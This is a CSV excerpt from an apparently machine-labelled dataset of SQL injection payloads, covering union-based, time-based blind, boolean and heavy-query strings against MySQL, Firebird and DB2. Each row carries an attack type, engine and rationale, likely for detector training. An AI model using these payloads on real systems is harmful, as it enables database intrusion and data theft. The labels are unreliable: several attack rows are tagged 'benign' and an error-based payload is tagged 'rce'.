row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
4930,"1"" ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
4931,1'+ ( select ukwc where 3008 = 3008 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
4932,"1"" where 2483 = 2483",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4933,"-6442"" ) ) ) or 3038 = 3038",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4934,1%' and ( 2439 = 2555 ) *2555 and '%' = ',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4935,"1"" or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""kbex"" like ""kbex",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
4936,"1' where 9420 = 9420 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
4937,"-8215%"" ) union all select 3877,3877,3877,3877,3877,3877--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4938,"-7069 ) union all select 6638,6638,6638,6638,6638,6638--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4939,select ( case when ( 8234 = 2498 ) then 8234 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4940,1' ) where 2120 = 2120,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4941,"iif ( 1878 = 2513,1,1/0 )",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
4942,"1%"" ) ) ) union all select null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4943,1 ) and sleep ( 5 ) and ( 4855 = 4855,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
4944,"-9392 ) ) or elt ( 1032 = 1032,3623 ) and ( ( 2975 = 2975",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
4945,"-8200%"" ) ) union all select 7538,7538,7538#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4946,1 and ( 3437 = 2271 ) *2271,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4947,"-5802' ) ) ) union all select 6286,6286,6286,6286#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4948,"1'+ ( select 'plcm' where 2141 = 2141 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
4949,"1 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) -- uslt",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
